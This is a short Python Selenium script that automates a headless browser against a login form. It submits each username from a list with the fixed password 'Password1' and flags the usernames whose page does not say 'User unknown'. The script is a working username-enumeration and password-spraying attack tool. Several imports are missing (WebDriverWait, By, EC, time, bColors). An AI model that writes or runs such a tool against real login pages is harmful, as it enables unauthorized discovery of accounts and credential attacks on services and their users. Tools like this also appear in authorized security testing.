from selenium import webdriver
from selenium.webdriver.chrome.options import Options

valid_usernames = []
password_to_spray = "Password1"
url = ""
chrome_options = Options()
chrome_options.add_argument("--headless=new")
chrome_options.add_argument("--mute-audio")
chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
browser = webdriver.Chrome(options=chrome_options)

with open("userlist_unverified.txt") as file:
    usernames = [line.rstrip() for line in file]

for username in usernames:
    browser.get(url)
    WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.CSS_SELECTOR, f"[name='m_cUserName']")))
    browser.find_element(By.CSS_SELECTOR, f"[name='m_cUserName']").send_keys(username)
    browser.find_element(By.CSS_SELECTOR, f"[name='m_cPassword']").send_keys(password_to_spray + "\n")
    time.sleep(3)

    if "User unknown" in browser.page_source:
        print(f"{bColors.FAIL}Unknown User:{bColors.ENDC} {username}")
    else:
        print(f"{bColors.OKGREEN}Potential User:{bColors.ENDC} {username}\n{browser.page_source}")
        valid_usernames.append(username)

print(f"\n\nPotentially Valid Usernames:")
for valid_username in valid_usernames:
    print(valid_username)
